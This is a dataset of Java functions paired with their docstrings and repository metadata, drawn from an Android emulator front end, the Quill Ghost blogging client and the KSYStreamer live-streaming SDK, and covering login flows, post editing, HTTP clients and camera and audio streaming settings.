{"docstring": "/**\n * @param requestCode An int describing whether the Activity that is returning did so successfully.\n * @param resultCode  An int describing what Activity is giving us this callback.\n * @param result      The information the returning Activity is providing us.\n */\n", "func_signal": "@Override\nprotected void onActivityResult(int requestCode, int resultCode, Intent result)", "code": "{\n  switch (requestCode)\n  {\n    case MainPresenter.REQUEST_ADD_DIRECTORY:\n      // If the user picked a file, as opposed to just backing out.\n      if (resultCode == MainActivity.RESULT_OK)\n      {\n        mPresenter.onDirectorySelected(FileBrowserHelper.getSelectedDirectory(result));\n      }\n      break;\n\n    case MainPresenter.REQUEST_EMULATE_GAME:\n      mPresenter.refreshFragmentScreenshot(resultCode);\n      break;\n  }\n}", "path": "app\\src\\main\\java\\org\\citra\\citra_android\\ui\\main\\MainActivity.java", "repo_name": "SachinVin/citra_android", "stars": 573, "license": "gpl-3.0", "language": "java", "size": 2627}
{"docstring": "// private methods\n", "func_signal": "private void scheduleDataRefresh()", "code": "{\n    // cancel already-scheduled refresh event\n    cancelDataRefresh();\n    // NOTE do not pass this::refreshData directly, because that creates a new Runnable and\n    // hence cannot be removed using Handler.removeCallbacks later, indirectly causing the\n    // entire Activity to leak!\n    mHandler.postDelayed(mRefreshDataRunnable, REFRESH_FREQUENCY);\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\view\\PostListActivity.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "/**\n * Generates a temporary primary key until the actual id is generated by the server. <b>Be\n * careful when calling this in a loop, if you don't save the object before calling it again,\n * you'll get the same id twice!</b>\n */\n", "func_signal": "@NonNull\nprivate <T extends RealmModel> String getTempUniqueId(Class<T> clazz)", "code": "{\n    int tempId = Integer.MAX_VALUE;\n    while (mRealm.where(clazz).equalTo(\"id\", String.valueOf(tempId)).findAll().size() > 0) {\n        --tempId;\n    }\n    return String.valueOf(tempId);\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\network\\NetworkService.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// Add a custom event handler for link clicks in TextView HTML\n// credits: https://stackoverflow.com/a/19989677/504611\n", "func_signal": "public static void setHtmlWithLinkClickHandler(TextView tv, String html,\n                                        Action1<String> linkClickHandler)", "code": "{\n    CharSequence sequence = Html.fromHtml(html);\n    SpannableStringBuilder strBuilder = new SpannableStringBuilder(sequence);\n    URLSpan[] urls = strBuilder.getSpans(0, sequence.length(), URLSpan.class);\n    for (URLSpan span : urls) {\n        int start = strBuilder.getSpanStart(span);\n        int end = strBuilder.getSpanEnd(span);\n        int flags = strBuilder.getSpanFlags(span);\n        ClickableSpan clickable = new ClickableSpan() {\n            public void onClick(View view) {\n                linkClickHandler.call(span.getURL());\n            }\n        };\n        strBuilder.setSpan(clickable, start, end, flags);\n        strBuilder.removeSpan(span);\n    }\n    tv.setText(strBuilder);\n    tv.setMovementMethod(LinkMovementMethod.getInstance());\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\util\\AppUtils.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// I don't know how to call this from the Application class!\n", "func_signal": "@SuppressWarnings(\"unused\")\npublic void stop()", "code": "{\n    getBus().unregister(this);\n    mRealm.close();\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\network\\NetworkService.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// TODO remember to update this, equals, Parcelable methods, PostUtils.isDirty() and DB migration whenever fields are changed!\n", "func_signal": "public Post(@NonNull Post post)", "code": "{\n    this.setId(post.getId());\n    this.setUuid(post.getUuid());\n    this.setTitle(post.getTitle());\n    this.setSlug(post.getSlug());\n    this.setStatus(post.getStatus());\n    this.setMarkdown(post.getMarkdown());\n    this.setMobiledoc(post.getMobiledoc());\n    this.setHtml(post.getHtml());\n\n    List<Tag> realmTags = post.getTags();\n    RealmList<Tag> unmanagedTags = new RealmList<>();\n    for (Tag realmTag : realmTags) {\n        unmanagedTags.add(new Tag(realmTag));\n    }\n    this.setTags(unmanagedTags);\n\n    this.setFeatureImage(post.getFeatureImage());\n    this.setFeatured(post.isFeatured());\n    this.setPage(post.isPage());\n    this.setLanguage(post.getLanguage());\n\n    this.setAuthor(post.getAuthor());\n    this.setCreatedBy(post.getCreatedBy());\n    this.setUpdatedBy(post.getUpdatedBy());\n    this.setPublishedBy(post.getPublishedBy());\n\n    this.setCreatedAt(post.getCreatedAt());\n    this.setUpdatedAt(post.getUpdatedAt());\n    this.setPublishedAt(post.getPublishedAt());\n\n    this.setMetaTitle(post.getMetaTitle());\n    this.setMetaDescription(post.getMetaDescription());\n\n    this.setCustomExcerpt(post.getCustomExcerpt());\n\n    for (PendingAction action : post.getPendingActions()) {\n        this.addPendingAction(action.getType());\n    }\n    this.setConflictState(post.getConflictState());\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\model\\entity\\Post.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// helper methods\n", "func_signal": "private static ErrorType getErrorType(Throwable error)", "code": "{\n    ErrorType errorType = ErrorType.ERR_UNKNOWN;\n    if (NetworkUtils.isUserNetworkError(error)) {\n        errorType = ErrorType.ERR_USER_NETWORK;\n    } else if (NetworkUtils.isConnectionError(error)) {\n        errorType = ErrorType.ERR_CONNECTION;\n    } else if (NetworkUtils.isSslError(error)) {\n        errorType = ErrorType.ERR_SSL;\n    }\n    return errorType;\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\auth\\LoginOrchestrator.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// the entire login flow is specified here, from start to finish\n", "func_signal": "private Disposable kickOffLoginFlow(String blogUrl)", "code": "{\n    // READ THIS: https://upday.github.io/blog/subscribe_on/\n    return mBlogUrlValidator\n            .validate(blogUrl)\n                .subscribeOn(Schedulers.io())\n                .observeOn(Schedulers.io())\n            .doOnNext(this::setState)\n            .flatMap(url -> mApiProvider.getGhostApi().getConfiguration())\n            .flatMap(config -> this.getAuthToken(mApiProvider.getGhostApi(), config))\n                .observeOn(AndroidSchedulers.mainThread())\n            .subscribe(this::handleAuthToken, this::handleError);\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\auth\\LoginOrchestrator.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// private methods\n", "func_signal": "private void clearAndSetPendingActionOnPost(@NonNull Post post, @PendingAction.Type String newPendingAction)", "code": "{\n    List<PendingAction> pendingActions = post.getPendingActions();\n    mRealm.executeTransaction(realm -> {\n        // make a copy since the original is a live-updating RealmList\n        List<PendingAction> pendingActionsCopy = new ArrayList<>(pendingActions);\n        for (PendingAction pa : pendingActionsCopy) {\n            RealmObject.deleteFromRealm(pa);\n        }\n        pendingActions.clear();\n        post.addPendingAction(newPendingAction);\n    });\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\network\\NetworkService.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "/**\n * Add a {@link PendingAction} to the given {@link Post}, if it doesn't already exist.\n * @param type the type of the pending action to add\n * @return true if the action was added now, false if it already existed\n */\n", "func_signal": "public boolean addPendingAction(@NonNull @PendingAction.Type String type)", "code": "{\n    if (hasPendingAction(type)) return false;\n    getPendingActions().add(new PendingAction(type));\n    return true;\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\model\\entity\\Post.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "/**\n * @param cacheDir - directory for the HTTP cache, disabled if null\n * @return an HTTP client intended for production use\n */\n", "func_signal": "@Override\npublic OkHttpClient create(@Nullable File cacheDir)", "code": "{\n    OkHttpClient.Builder builder = new OkHttpClient.Builder();\n    if (cacheDir != null) {\n        long size = calculateDiskCacheSize(cacheDir);\n        builder.cache(new Cache(cacheDir, size));\n    }\n    return builder\n            .connectTimeout(CONNECT_TIMEOUT, TimeUnit.SECONDS)\n            .readTimeout(READ_TIMEOUT, TimeUnit.SECONDS)\n            .writeTimeout(WRITE_TIMEOUT, TimeUnit.SECONDS)\n            .build();\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\network\\ProductionHttpClientFactory.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// TODO consider moving this and other logic out into a View-Model\n", "func_signal": "public boolean shouldShowPublishAction()", "code": "{\n    // show the publish action for drafts and for locally-edited published posts\n    if (mPost.isDraft()\n            || mPost.hasPendingAction(PendingAction.EDIT_LOCAL)\n            || mPostChangedInMemory) {\n        stopMonitoringPostSettings();\n        return true;\n    } else {\n        // published post with no auto-saved edits (may have unsynced published edits though)\n        startMonitoringPostSettings();\n        return false;\n    }\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\view\\fragments\\PostEditFragment.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "/**\n * @param blogUrl - URL to validate, without http:// or https://\n */\n", "func_signal": "@Override\npublic Observable<String> validate(@NonNull String blogUrl)", "code": "{\n    // try HTTPS and HTTP, in that order\n    return Observable.create(source -> {\n        checkGhostBlog(\"https://\" + blogUrl, mHttpClient)\n                .onErrorResumeNext(checkGhostBlog(\"http://\" + blogUrl, mHttpClient))\n                .subscribe(source::onNext, e -> {\n                    source.onError(new UrlValidationException(e, \"https://\" + blogUrl));\n                });\n    });\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\auth\\NetworkBlogUrlValidator.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// credential sink\n", "func_signal": "@Override\npublic void saveCredentials(String blogUrl, AuthReqBody authReqBody)", "code": "{\n    BlogMetadata blog;\n    if (AccountManager.hasBlog(blogUrl)) {\n        blog = AccountManager.getBlog(blogUrl);\n    } else {\n        blog = new BlogMetadata();\n        blog.setBlogUrl(blogUrl);\n    }\n\n    if (authReqBody.isGrantTypePassword()) {\n        blog.setEmail(authReqBody.email);\n        blog.setPassword(authReqBody.password);\n    } else {\n        blog.setAuthCode(authReqBody.authorizationCode);\n    }\n    blog.setLoggedIn(true);\n    AccountManager.addOrUpdateBlog(blog);\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\auth\\AuthStore.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// suppressed because PermissionsDispatcher handles API levels for us\n", "func_signal": "@NeedsPermission(Manifest.permission.READ_EXTERNAL_STORAGE)\n   public void onInsertImageUploadClicked(Action1<String> uploadDoneAction)", "code": "{\n       mImageUploadDoneAction = uploadDoneAction;\n       Intent imagePickIntent = new Intent(Intent.ACTION_GET_CONTENT);\n       imagePickIntent.addCategory(Intent.CATEGORY_OPENABLE);\n       imagePickIntent.setType(\"image/*\");\n       if (imagePickIntent.resolveActivity(mActivity.getPackageManager()) != null) {\n           startActivityForResult(imagePickIntent, REQUEST_CODE_IMAGE_PICK);\n       } else {\n           Toast.makeText(mActivity, R.string.intent_no_apps, Toast.LENGTH_SHORT).show();\n       }\n   }", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\view\\fragments\\PostEditFragment.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// returns true if a network call is pending, false otherwise\n", "func_signal": "private boolean savePost(boolean persistChanges, boolean isAutoSave,\n                         @Nullable @Post.Status String newStatus)", "code": "{\n    mPost.setTitle(mPostTitleEditView.getText().toString());\n    mPost.setMarkdown(mPostEditView.getText().toString());\n    mPost.setHtml(null);   // omit stale HTML from request body\n    mPost.setTags(mPostSettingsManager.getTags());\n    mPost.setCustomExcerpt(mPostSettingsManager.getCustomExcerpt());\n    mPost.setFeatured(mPostSettingsManager.isFeatured());\n    mPost.setPage(mPostSettingsManager.isPage());\n    if (newStatus != null) {\n        mPost.setStatus(newStatus);\n    }\n\n    // this handles cases like edit => onPause saves changes => discard, which should discard\n    // ALL changes made since the editor was opened, hence save mOriginalPost (can't use\n    // savePost(!mbDiscardChanges, ...) in onPause for this reason)\n    if (mbDiscardChanges) {\n        // avoid network call if no changes have been made SINCE THE POST WAS OPENED FOR EDITING\n        if (! PostUtils.isDirty(mOriginalPost, mPost)) return false;\n        getBus().post(new SavePostEvent(mOriginalPost, false));\n        mbDiscardChanges = false;\n        return true;\n    } else if (persistChanges) {\n        // avoid network call if AUTO-SAVING and no changes have been made SINCE LAST SAVE\n        if (isAutoSave && ! PostUtils.isDirty(mLastSavedPost, mPost)) return false;\n        getBus().post(new SavePostEvent(mPost, isAutoSave));\n        return true;\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\view\\fragments\\PostEditFragment.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// TODO temporary crutch while I refactor this huge class\n", "func_signal": "@Override\npublic void setApiService(String blogUrl, GhostApiService api)", "code": "{\n    mApi = api;\n    if (mAuthService != null) {\n        mAuthService.unlisten(this);\n    }\n    mAuthService = AuthService.createWithStoredCredentials(blogUrl, api);\n    mAuthService.listen(this);\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\network\\NetworkService.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// private helpers\n", "func_signal": "private static void doWithAuthToken(Action1<AuthToken> callback)", "code": "{\n    String clientSecret = getClientSecret();\n    assertThat(clientSecret, notNullValue());\n    AuthReqBody credentials = AuthReqBody.fromPassword(clientSecret, TEST_USER, TEST_PWD);\n    AuthToken token = execute(API.getAuthToken(credentials));\n    try {\n        callback.call(token);\n    } finally {\n        // revoke refresh token BEFORE access token, because the access token is needed for revocation!\n        RevokeReqBody[] revokeReqs = new RevokeReqBody[] {\n                RevokeReqBody.fromRefreshToken(token.getRefreshToken(), clientSecret),\n                RevokeReqBody.fromAccessToken(token.getAccessToken(), clientSecret),\n        };\n        for (RevokeReqBody reqBody : revokeReqs) {\n            execute(API.revokeAuthToken(token.getAuthHeader(), reqBody));\n        }\n    }\n}", "path": "app\\src\\test\\java\\me\\vickychijwani\\spectre\\network\\GhostApiTest.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "/**\n * Set the app to use the given locale. Useful for testing translations. This is normally\n * not needed because the device locale is applied automatically.\n * @param context - context from which to get resources\n * @param locale - the locale to use\n */\n", "func_signal": "public static void setLocale(@NonNull Context context, @NonNull Locale locale)", "code": "{\n    Locale.setDefault(locale);\n    Resources res = context.getResources();\n    DisplayMetrics dm = res.getDisplayMetrics();\n    android.content.res.Configuration conf = res.getConfiguration();\n    conf.locale = Locale.getDefault();\n    res.updateConfiguration(conf, dm);\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\util\\AppUtils.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// credential source\n", "func_signal": "@Override\npublic Observable<String> getGhostAuthCode(GhostAuth.Params params)", "code": "{\n    BlogMetadata blog = AccountManager.getBlog(params.blogUrl);\n    return Observable.just(blog.getAuthCode());\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\auth\\AuthStore.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "// TODO remember to update this, equals, Parcelable methods, and DB migration whenever fields are changed!\n", "func_signal": "public Tag(@NonNull Tag other)", "code": "{\n    this.setId(other.getId());\n    this.setName(other.getName());\n    this.setSlug(other.getSlug());\n    this.setDescription(other.getDescription());\n    this.setImage(other.getImage());\n    this.setHidden(other.isHidden());\n    this.setMetaTitle(other.getMetaTitle());\n    this.setMetaDescription(other.getMetaDescription());\n    this.setCreatedAt(other.getCreatedAt());\n    this.setUpdatedAt(other.getUpdatedAt());\n}", "path": "app\\src\\main\\java\\me\\vickychijwani\\spectre\\model\\entity\\Tag.java", "repo_name": "vickychijwani/quill", "stars": 555, "license": "mit", "language": "java", "size": 12540}
{"docstring": "/**\n * Start still image capture, usually to take place of CameraCapture.\n *\n * @param bitmap  bitmap to be set.\n * @param recycle should this bitmap to be recycled automatically by sdk.\n */\n", "func_signal": "public void startImageCapture(Bitmap bitmap, boolean recycle)", "code": "{\n    mImageCapture.getSrcPin().connect(mImgTexPreviewMixer.getSinkPin(mIdxCamera));\n    mImageCapture.getSrcPin().connect(mImgTexMixer.getSinkPin(mIdxCamera));\n    mImageCapture.setRepeatFps(mPreviewFps);\n    mImageCapture.start(bitmap, recycle);\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Set streaming resolution.<br/>\n * <p>\n * The set resolution would take effect immediately if streaming started.<br/>\n * <p>\n * The set width and height must not be 0 at same time.\n * If one of the params is 0, the other would calculated by the actual preview view size\n * to keep the ratio of the preview view.\n *\n * @param width  streaming width.\n * @param height streaming height.\n * @throws IllegalArgumentException\n */\n", "func_signal": "public void setTargetResolution(int width, int height) throws IllegalArgumentException", "code": "{\n    if (width < 0 || height < 0 || (width == 0 && height == 0)) {\n        throw new IllegalArgumentException(\"Invalid resolution\");\n    }\n    mTargetWidth = width;\n    mTargetHeight = height;\n\n    if (mScreenRenderWidth != 0 && mScreenRenderHeight != 0) {\n        calResolution();\n        mImgTexMixer.setTargetSize(mTargetWidth, mTargetHeight);\n        mVideoEncoderMgt.setImgBufTargetSize(mTargetWidth, mTargetHeight);\n    }\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Get dropped frame number.\n *\n * @return Frame dropped number on current streaming session.\n * @see #getVideoEncoderMgt()\n * @see VideoEncoderMgt#getEncoder()\n * @see Encoder#getFrameDropped()\n * @see #getRtmpPublisher()\n * @see RtmpPublisher#getDroppedVideoFrames()\n */\n", "func_signal": "public int getDroppedFrameCount()", "code": "{\n    return mVideoEncoderMgt.getEncoder().getFrameDropped() +\n            mRtmpPublisher.getDroppedVideoFrames();\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Set if enable audio mix, usually set true when headset plugged.\n *\n * @param enable true to enable, false to disable.\n */\n", "func_signal": "public void setEnableAudioMix(boolean enable)", "code": "{\n    mEnableAudioMix = enable;\n    if (mEnableAudioMix) {\n        mAudioPlayerCapture.getSrcPin().connect(mAudioMixer.getSinkPin(mIdxAudioBgm));\n    } else {\n        mAudioPlayerCapture.getSrcPin().disconnect(mAudioMixer.getSinkPin(mIdxAudioBgm), false);\n    }\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Set audio channel number.<br/>\n * Would take effect on next {@link #startStream()} call.\n * default value : 1\n *\n * @param channels audio channel number, 1 for mono, 2 for stereo.\n * @throws IllegalArgumentException\n */\n", "func_signal": "public void setAudioChannels(int channels) throws IllegalArgumentException", "code": "{\n    if (channels != 1 && channels != 2) {\n        throw new IllegalArgumentException(\"the AudioChannels must be mono or stereo\");\n    }\n\n    mAudioChannels = channels;\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Stop streaming.\n *\n * @return false if it's not streaming, true otherwise.\n */\n", "func_signal": "public boolean stopStream()", "code": "{\n    if (!mIsRecording) {\n        return false;\n    }\n    if (!mIsFileRecording) {\n        stopCapture();\n    }\n    mIsRecording = false;\n    mRtmpPublisher.disconnect();\n    return true;\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Set encode method for audio.<br/>\n * Must not be set while encoding.\n *\n * @param encodeMethod Encode method.<br/>\n * @throws IllegalStateException\n * @see StreamerConstants#ENCODE_METHOD_SOFTWARE\n * @see StreamerConstants#ENCODE_METHOD_HARDWARE\n */\n", "func_signal": "public void setAudioEncodeMethod(int encodeMethod)\n        throws IllegalStateException, IllegalArgumentException", "code": "{\n    if (!isValidEncodeMethod(encodeMethod)) {\n        throw new IllegalArgumentException();\n    }\n\n    if (mIsRecording) {\n        throw new IllegalStateException(\"Cannot set encode method while recording\");\n    }\n    mAudioEncoderMgt.setEncodeMethod(encodeMethod);\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Set audio NoiseSuppression level, default AUDIO_NS_LEVEL_1.\n *\n * @param level ns level to be set (AUDIO_NS_LEVEL_0~AUDIO_NS_LEVEL_3 define in StreamerConstants)\n */\n", "func_signal": "public void setAudioNSLevel(int level)", "code": "{\n    if (level < StreamerConstants.AUDIO_NS_LEVEL_0 || level > StreamerConstants.AUDIO_NS_LEVEL_3) {\n        throw new IllegalArgumentException(\"the NS level must be between 0 and 3\");\n    }\n    mAudioAPMFilterMgt.setAudioNSLevel(level);\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Should be called on Activity.onPause or Fragment.onPause.\n */\n", "func_signal": "public void onPause()", "code": "{\n    Log.d(TAG, \"onPause\");\n    mImgTexPreview.onPause();\n    if (mEnableRepeatLastFrame && mIsRecording && !mIsAudioOnly) {\n        getVideoEncoderMgt().getEncoder().startRepeatLastFrame();\n    }\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Start camera preview with given facing.\n *\n * @param facing camera facing.\n * @see CameraCapture#FACING_FRONT\n * @see CameraCapture#FACING_BACK\n */\n", "func_signal": "public void startCameraPreview(int facing)", "code": "{\n    mCameraFacing = facing;\n    if ((mPreviewWidth == 0 || mPreviewHeight == 0) &&\n            (mScreenRenderWidth == 0 || mScreenRenderHeight == 0)) {\n        if (mImgTexPreview.getDisplayPreview() != null) {\n            mDelayedStartCameraPreview = true;\n            return;\n        }\n        mScreenRenderWidth = DEFAULT_PREVIEW_WIDTH;\n        mScreenRenderHeight = DEFAULT_PREVIEW_HEIGHT;\n    }\n    setPreviewParams();\n    mCameraCapture.start(mCameraFacing);\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Set if in audio only streaming mode.<br/>\n * If enable audio only before start stream, then disable it while streaming will\n * cause streaming error. Otherwise, start stream with audio only disabled,\n * you can enable or disable it dynamically.\n *\n * @param audioOnly true to enable, false to disable.\n */\n", "func_signal": "public void setAudioOnly(boolean audioOnly)", "code": "{\n    if (mIsAudioOnly == audioOnly) {\n        return;\n    }\n    if (audioOnly) {\n        mVideoEncoderMgt.getSrcPin().disconnect(false);\n        if (mIsRecording) {\n            mVideoEncoderMgt.getEncoder().stop();\n        }\n    } else {\n        mVideoEncoderMgt.getSrcPin().connect(mPublisherMgt.getVideoSink());\n        if (mIsRecording) {\n            mVideoEncoderMgt.getEncoder().start();\n        }\n    }\n    mRtmpPublisher.setAudioOnly(audioOnly);\n    mFilePublisher.setAudioOnly(audioOnly);\n    mIsAudioOnly = audioOnly;\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Set preview fps.<br/>\n * <p>\n * The set fps would take effect on next {@link #startCameraPreview()}\n * {@link #startCameraPreview(int)} call.<br/>\n * <p>\n * The actual preview fps depends on the running device, may be different with the set value.\n *\n * @param fps frame rate to be set.\n * @throws IllegalArgumentException\n */\n", "func_signal": "public void setPreviewFps(float fps) throws IllegalArgumentException", "code": "{\n    if (fps <= 0) {\n        throw new IllegalArgumentException(\"the fps must > 0\");\n    }\n    mPreviewFps = fps;\n    if (mTargetFps == 0) {\n        mTargetFps = mPreviewFps;\n    }\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Set enable debug log or not.\n *\n * @param enableDebugLog true to enable, false to disable.\n */\n", "func_signal": "public void enableDebugLog(boolean enableDebugLog)", "code": "{\n    mEnableDebugLog = enableDebugLog;\n    StatsLogReport.getInstance().setEnableDebugLog(mEnableDebugLog);\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Show watermark logo both on preview and stream.\n *\n * @param bitmap logo bitmap, should not be recycled by caller\n * @param x      x position for left top of logo relative to the video, between 0~1.0.\n * @param y      y position for left top of logo relative to the video, between 0~1.0.\n * @param w      width of logo relative to the video, between 0~1.0, if set to 0,\n *               width would be calculated by h and logo image radio.\n * @param h      height of logo relative to the video, between 0~1.0, if set to 0,\n *               height would be calculated by w and logo image radio.\n * @param alpha  alpha value\uff0cbetween 0~1.0\n */\n", "func_signal": "public void showWaterMarkLogo(Bitmap bitmap, float x, float y, float w, float h, float alpha)", "code": "{\n    alpha = Math.max(0.0f, alpha);\n    alpha = Math.min(alpha, 1.0f);\n    mImgTexMixer.setRenderRect(mIdxWmLogo, x, y, w, h, alpha);\n    mImgTexPreviewMixer.setRenderRect(mIdxWmLogo, x, y, w, h, alpha);\n    mVideoEncoderMgt.getImgBufMixer().setRenderRect(1, x, y, w, h, alpha);\n    mWaterMarkCapture.showLogo(bitmap, w, h);\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Set camera capture resolution.<br/>\n * <p>\n * The set resolution would take effect on next {@link #startCameraPreview()}\n * {@link #startCameraPreview(int)} call.<br/>\n *\n * @param idx Resolution index.<br/>\n * @throws IllegalArgumentException\n * @see StreamerConstants#VIDEO_RESOLUTION_360P\n * @see StreamerConstants#VIDEO_RESOLUTION_480P\n * @see StreamerConstants#VIDEO_RESOLUTION_540P\n * @see StreamerConstants#VIDEO_RESOLUTION_720P\n * @see StreamerConstants#VIDEO_RESOLUTION_1080P\n */\n", "func_signal": "public void setCameraCaptureResolution(int idx) throws IllegalArgumentException", "code": "{\n    if (idx < StreamerConstants.VIDEO_RESOLUTION_360P ||\n            idx > StreamerConstants.VIDEO_RESOLUTION_1080P) {\n        throw new IllegalArgumentException(\"Invalid resolution index\");\n    }\n    int height = getShortEdgeLength(idx);\n    int width = height * 16 / 9;\n    mCameraCapture.setPreviewSize(width, height);\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Set preview resolution.<br/>\n * <p>\n * The set resolution would take effect on next {@link #startCameraPreview()}\n * {@link #startCameraPreview(int)} call, if called not in previewing mode.<br/>\n * If called in previewing mode, it would take effect immediately.<br/>\n * <p>\n * The set width and height must not be 0 at same time.\n * If one of the params is 0, the other would calculated by the actual preview view size\n * to keep the ratio of the preview view.\n *\n * @param width  preview width.\n * @param height preview height.\n * @throws IllegalArgumentException\n */\n", "func_signal": "public void setPreviewResolution(int width, int height) throws IllegalArgumentException", "code": "{\n    if (width < 0 || height < 0 || (width == 0 && height == 0)) {\n        throw new IllegalArgumentException(\"Invalid resolution\");\n    }\n    mPreviewWidth = width;\n    mPreviewHeight = height;\n\n    if (mScreenRenderWidth != 0 && mScreenRenderHeight != 0) {\n        calResolution();\n        mImgTexScaleFilter.setTargetSize(mPreviewWidth, mPreviewHeight);\n        mImgTexPreviewMixer.setTargetSize(mPreviewWidth, mPreviewHeight);\n    }\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
{"docstring": "/**\n * Set video bitrate in bps, and disable video bitrate auto adjustment.<br/>\n * Would take effect on next {@link #startStream()} call.\n * default value : 600 * 1000\n *\n * @param bitrate video bitrate in bps\n * @throws IllegalArgumentException\n */\n", "func_signal": "public void setVideoBitrate(int bitrate) throws IllegalArgumentException", "code": "{\n    if (bitrate <= 0) {\n        throw new IllegalArgumentException(\"the VideoBitrate must > 0\");\n    }\n    mInitVideoBitrate = bitrate;\n    mMaxVideoBitrate = bitrate;\n    mMinVideoBitrate = bitrate;\n    mAutoAdjustVideoBitrate = false;\n}", "path": "src\\KSYStreamer.java", "repo_name": "fpzeng/KSYStreamer_Android", "stars": 726, "license": "None", "language": "java", "size": 226770}
